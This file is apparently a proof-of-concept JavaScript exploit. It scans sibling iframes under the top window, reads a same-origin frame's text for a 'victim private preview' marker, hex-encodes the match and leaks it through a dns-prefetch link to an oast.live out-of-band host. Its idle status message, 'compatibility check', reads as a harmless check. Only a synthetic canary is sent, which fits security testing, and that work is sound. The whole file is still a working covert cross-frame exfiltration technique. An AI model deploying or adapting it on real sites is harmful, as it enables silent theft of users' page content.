const statusNode = document.getElementById("status");
const ownOuterFrame = window.parent;
const syntheticCanary = "VICTIM_PRIVATE_PREVIEW_20261106";
const controlledDnsReceiver =
  "dbn0ruj6rrcmkt9f0tl0hr13xwdd38rqw.oast.live";

let dispatched = false;

function setStatus(value) {
  if (statusNode) {
    statusNode.textContent = value;
  }
}

function toHexLabel(value) {
  return Array.from(new TextEncoder().encode(value), (byte) =>
    byte.toString(16).padStart(2, "0"),
  ).join("");
}

function checkAndDispatchSyntheticCanary() {
  if (dispatched) {
    return;
  }

  for (let index = 0; index < window.top.length; index += 1) {
    try {
      const siblingOuterFrame = window.top.frames[index];

      if (siblingOuterFrame === ownOuterFrame || siblingOuterFrame.length < 1) {
        continue;
      }

      const siblingText =
        siblingOuterFrame.frames[0].document.body?.innerText ?? "";
      const markerStart = siblingText.indexOf(syntheticCanary);

      if (markerStart < 0) {
        continue;
      }

      const matchedCanary = siblingText.slice(
        markerStart,
        markerStart + syntheticCanary.length,
      );
      const canaryLabel = toHexLabel(matchedCanary);

      dispatched = true;
      setStatus("SYNTHETIC_DNS_CANARY_DISPATCHED");

      // DNS prefetch is enough to produce a controlled authoritative-DNS
      // receipt. Only the exact synthetic marker is hex-encoded in the label.
      const dnsReceipt = document.createElement("link");
      dnsReceipt.rel = "dns-prefetch";
      dnsReceipt.href = `//${canaryLabel}.${controlledDnsReceiver}/`;
      document.head.appendChild(dnsReceipt);
      return;
    } catch {
      // Different-origin frames are expected and intentionally ignored.
    }
  }

  setStatus("COMPATIBILITY_CHECK_READY");
}

checkAndDispatchSyntheticCanary();
setInterval(checkAndDispatchSyntheticCanary, 500);
